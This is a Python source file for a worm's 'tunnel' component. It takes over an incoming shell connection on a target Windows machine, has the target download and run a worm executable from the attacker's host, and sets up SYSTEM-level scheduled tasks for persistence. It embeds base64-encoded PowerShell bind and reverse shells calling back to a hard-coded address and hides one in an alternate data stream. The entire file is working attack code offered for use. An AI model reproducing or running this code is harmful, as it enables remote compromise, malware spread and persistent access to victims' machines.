import threading
import time, select
from deployment import deployment

class tunnel(threading.Thread):
    
    # initialize the tunnel class
    def __init__(self, worm, sock, lhost="0.0.0.0", lport=1337):
        self.worm = worm
        self.lhost = lhost
        self.lport = lport
        self.sock = sock
        print("Establishing Tunnel - listening on port {}".format(self.lport))
        self.connection = {}
        super().__init__()
    
    #start the thread process
    def run(self):
        try:
            print("accepting traffic on port {}".format(self.lport))

            # wait for the incoming shell connection
            conn, addr = self.sock.accept()

            # set timeout on the connection
            conn.settimeout(10)

            #store the connection and address
            self.set_connection(conn,addr)
            print("Got a connection from: {}",addr)
            
            osplatform = "windows"
            if osplatform == "windows":
                dir = "C:/Users/Public/Documents"
            else:
                dir = "/tmp/"
            
            # start to deploy virus process
            self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)

            # start to create persistence proces on windows
            #self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
            
            # close the connection
            conn.close()

        except TimeoutError:
            print("Timeout Error, Possbile on Infection Phrase - Target Machine BSOD. Terminate Current Tunnel")
    
    
    # handles the send command between the attacker and the target
    def sent_command(self, command, conn):
        print(command)
        conn.send(command)
        time.sleep(2)
    
    def sent_large_command(self, command, conn):
        #print(command)
        total_sent = 0
        while total_sent < len(command):
            sent = conn.send(command[total_sent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            total_sent = total_sent + sent

    # retrieve the response that the target send back
    def get_response(self,conn,size=1024):
        response = conn.recv(size).decode()
        return response
    
    def get_large_response(self, conn, size=8192):
        while not select.select([conn], [], [], 0.0)[0]:
            time.sleep(1)
        response = conn.recv(size).decode()
        return response

    def get_done(self):
        return self.complete

    # def delivery_virus(self, target_ip, virus):
    #     self.get_connection(target_ip).sendall(virus)

    # generate a base64 bind shell
    def generate_base64_bind_shell_code(self, ostype:str):
        if ostype == "windows":
            bind_shell = ""
            bind_shell += "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0"
            bind_shell += "AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADUANgAuADEAMAA4ACcALAA3ADcANwA3ACkAOwAkAHMA"
            bind_shell += "dAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABi"
            bind_shell += "AHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIA"
            bind_shell += "ZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBu"
            bind_shell += "AGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMA"
            bind_shell += "eQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABi"
            bind_shell += "AHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4A"
            bind_shell += "JgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBh"
            bind_shell += "AGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIA"
            bind_shell += "eQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABl"
            bind_shell += "AHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUA"
            bind_shell += "LAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7"
            bind_shell += "ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
            
            return bind_shell
        elif ostype == "linux":
            return ""
        else:
            return ""

    # generate a base64 reverse shell
    def generate_base64_reverse_shell_code(self, ostype:str):
        print("Create a reverse Shell on Port 7777")
        if ostype == "windows":
            reverse_shell = ""
            reverse_shell += "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0"
            reverse_shell += "AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADEANAA5AC4AMQAyADkAJwAsADcANwA3ADcAKQA7ACQA"
            reverse_shell += "cwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAk"
            reverse_shell += "AGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQA"
            reverse_shell += "cgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAt"
            reverse_shell += "AG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAA"
            reverse_shell += "UwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAk"
            reverse_shell += "AGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIA"
            reverse_shell += "PgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABi"
            reverse_shell += "AGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQA"
            reverse_shell += "YgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0"
            reverse_shell += "AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQA"
            reverse_shell += "ZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9"
            reverse_shell += "ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
            return reverse_shell
        elif ostype == "linux":
            return ""
        else:
            return ""

    #commands for create persistence on windows 10
    def create_persistence_windows(self, conn, ostype, dir,filename):
        #creating a backdoor access on the remote target, store the base64 code in alternative data stream
        #generate the command
        command = 'Set-Content -path "{}/{}:hidden" -Value "'.format(dir,filename).encode()
        command += self.generate_base64_reverse_shell_code("windows").encode()
        command += b'"'
        command+=b"\n"

        # send the command over
        self.sent_command(command,conn)
        print("Store Base64 Shell in {} Folder".format(dir))
        time.sleep(8)
        print(self.get_response(conn,4096))
        
        #generate the a schedule task on system start. execute the reverse shell
        command = 'schtasks /create /tn "reminderr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "powershell -Command \"`$command`=get-content {}/{}:hidden; powershell -encodedcommand `$command`\""'.format(dir,filename).encode()
        command+=b"\n"
        
        # send the command over
        self.sent_command(command,conn)
        print("Create a Schedule Tasks to Start the reverse Shell on Boot")
        print(self.get_response(conn,1024))
    
    def deploy_virus(self, data, conn, ostype="windows", dir=""):
        #setup the worm ready - deployment socket connection
        server = deployment("0.0.0.0",8081,data)
        server.start()
        
        #identify which operating system deploy to, and send corresponding commands over 
        if ostype=="windows":
            self.deploy_to_windows(conn, dir)
        else:
            self.deploy_to_linux(conn)

    #deploy to windows system       
    def deploy_to_windows(self,conn, dir):
        #start command sequence, 
        try:
            # commands for the target machine to reach back us for the worm
            print("Start Deploying worm to Windows")
            command = "cd {}".format(dir).encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("change to users directory")
            print(self.get_response(conn,1024))
            command = "powershell".encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("run powershell")
            print("Target Response: {}".format(self.get_response(conn)))
            command = '$client = New-Object System.Net.Sockets.TcpClient;'
            command += '$client.Connect("'+self.lhost+'", 8081); '
            command += '$stream = $client.GetStream(); '
            command += '$buffer = New-Object byte[] 1024; '
            command += '$receivedBytes = 0; '
            command += '$totalBytes = 0; '
            command += '$file = New-Object System.IO.FileStream("'+self.lhost+'_tworm.exe", [System.IO.FileMode]::Create); '
            command += 'do { $receivedBytes = $stream.Read($buffer, 0, 1024); '
            command += '$totalBytes += $receivedBytes; '
            command += '$file.Write($buffer, 0, $receivedBytes); } '
            command += 'while ($receivedBytes -ne 0); '
            command += '$file.Close(); '
            command += '$client.Close();'
            command = command.encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("target machine is starting to connect to the us")
            print("Target Response: {}".format(self.get_response(conn,1024)))
            time.sleep(10)

            #Setup Self execute on startup
            command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "{}/{}_tworm.exe";'.format(dir,self.lhost).encode()
            command+=b"\n"
            self.sent_command(command,conn)
            time.sleep(4)
            tasks_response = self.get_response(conn,1024)
            print("Target Response: {}".format(tasks_response))
            
            #check if the over the schedule tasks if the name alreay exists
            if "already exists" in tasks_response:
                command = b'Y'
                command+=b'\n'
                self.sent_command(command,conn)
                tasks_response = self.get_response(conn,1024)
                time.sleep(2)
                print("Target Response: {}".format(tasks_response))
            
            #execute the worm on the target machine
            command = "{}/{}_tworm.exe".format(dir,self.lhost).encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("Target Response: {}".format(self.get_response(conn,1024)))
    
        except TimeoutError as t:
            print("no Response")
            
            
    def deploy_to_linux(self, conn):
        pass        
    
    
    def set_connection(self, conn, addr):
        self.connection[addr] = conn


    def get_connection(self, target_ip):
        if target_ip in self.connection:
            return self.connection[target_ip]
        else:
            print("target connection does not exists {}".format(target_ip))
            return None


    def close_connection(self,client_ip):
        conn = self.get_connection(client_ip)
        if conn != None:
            conn.close()
        self.sock.close()
        
